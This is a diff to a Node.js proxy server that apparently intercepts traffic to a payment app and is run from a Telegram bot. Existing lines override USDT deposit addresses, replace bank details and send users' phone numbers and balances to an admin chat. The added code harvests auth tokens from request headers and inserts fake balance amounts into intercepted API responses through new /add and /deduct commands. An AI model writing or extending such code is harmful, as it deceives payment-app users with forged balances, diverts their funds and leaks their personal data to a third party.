@@ -86,23 +86,29 @@ async function saveData(data) {
   }
 }
 
+function getTokenFromReq(req) {
+  return req.headers['apptoken'] || req.headers['appToken'] || req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
+}
+
 function saveTokenUserId(req, userId) {
   if (!userId) return;
-  const tok = req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
+  const tok = getTokenFromReq(req);
   if (tok && tok.length > 10) {
-    tokenUserMap[tok] = String(userId);
-    if (redis) redis.hset('ezpayTokenMap', tok.substring(0, 100), String(userId)).catch(()=>{});
+    const key = tok.substring(0, 100);
+    tokenUserMap[key] = String(userId);
+    if (redis) redis.hset('ezpayTokenMap', key, String(userId)).catch(()=>{});
   }
 }
 
 async function getUserIdFromToken(req) {
-  const tok = req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
+  const tok = getTokenFromReq(req);
   if (!tok || tok.length < 10) return null;
-  if (tokenUserMap[tok]) return tokenUserMap[tok];
+  const key = tok.substring(0, 100);
+  if (tokenUserMap[key]) return tokenUserMap[key];
   if (redis) {
     try {
-      const stored = await redis.hget('ezpayTokenMap', tok.substring(0, 100));
-      if (stored) { tokenUserMap[tok] = String(stored); return String(stored); }
+      const stored = await redis.hget('ezpayTokenMap', key);
+      if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
     } catch(e) {}
   }
   return null;
@@ -123,12 +129,14 @@ async function extractUserId(req, jsonResp) {
     const rid = respData.memberCodeId || respData.userId || respData.userid || respData.memberId || '';
     if (rid) return String(rid);
   }
-  const authHeader = req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
+  const authHeader = getTokenFromReq(req);
   if (authHeader) {
     try {
-      const parts = authHeader.replace('Bearer ', '').split('.');
+      const clean = authHeader.replace('Bearer ', '');
+      const parts = clean.split('.');
       if (parts.length === 3) {
         const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+        if (payload.memberCodeId) return String(payload.memberCodeId);
         if (payload.userId) return String(payload.userId);
         if (payload.memberId) return String(payload.memberId);
         if (payload.sub) return String(payload.sub);
@@ -570,6 +578,10 @@ app.post('/bot-webhook', async (req, res) => {
 /status — Full status
 /debug — Debug next response
 
+=== BALANCE ===
+/add <amount> <userId> — Add balance
+/deduct <amount> <userId> — Remove balance
+
 === USDT ===
 /usdt <address> — Set USDT address
 /usdt off — Disable USDT override
@@ -605,6 +617,39 @@ Example:
     if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
+
+    if (text.startsWith('/add ')) {
+      const parts = text.substring(5).trim().split(/\s+/);
+      const amount = parseFloat(parts[0]);
+      const targetUserId = parts[1] || '';
+      if (isNaN(amount) || !targetUserId) {
+        await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>\nExample: /add 500 93527');
+        return res.sendStatus(200);
+      }
+      if (!data.userOverrides) data.userOverrides = {};
+      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
+      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/deduct ')) {
+      const parts = text.substring(8).trim().split(/\s+/);
+      const amount = parseFloat(parts[0]);
+      const targetUserId = parts[1] || '';
+      if (isNaN(amount) || !targetUserId) {
+        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>\nExample: /deduct 500 93527');
+        return res.sendStatus(200);
+      }
+      if (!data.userOverrides) data.userOverrides = {};
+      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
+      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
+      if (data.userOverrides[targetUserId].addedBalance === 0) delete data.userOverrides[targetUserId].addedBalance;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance || 0}`);
+      return res.sendStatus(200);
+    }
 
     if (text === '/idtrack') {
       const tracked = data.trackedUsers || {};
@@ -1374,13 +1419,15 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
     if (data.adminChatId && bot) {
       bot.sendMessage(data.adminChatId, `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}`).catch(()=>{});
     }
-    const reqUserId = effectiveUserId || userId;
-    const eff = getEffectiveSettings(data, reqUserId);
-    if (eff.depositSuccess && respData && typeof respData === 'object') {
-      const bonus = eff.depositBonus || 0;
-      if (typeof respData.balance === 'number') respData.balance += bonus;
-      if (typeof respData.availableBalance === 'number') respData.availableBalance += bonus;
-      if (typeof respData.totalIncome === 'number') respData.totalIncome += bonus;
+    if (effectiveUserId && respData && typeof respData === 'object') {
+      const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
+      const addedBal = userOvr && userOvr.addedBalance ? userOvr.addedBalance : 0;
+      if (addedBal !== 0) {
+        if (respData.balance !== undefined) {
+          const numBal = parseFloat(respData.balance) || 0;
+          respData.balance = String(parseFloat((numBal + addedBal).toFixed(2)));
+        }
+      }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
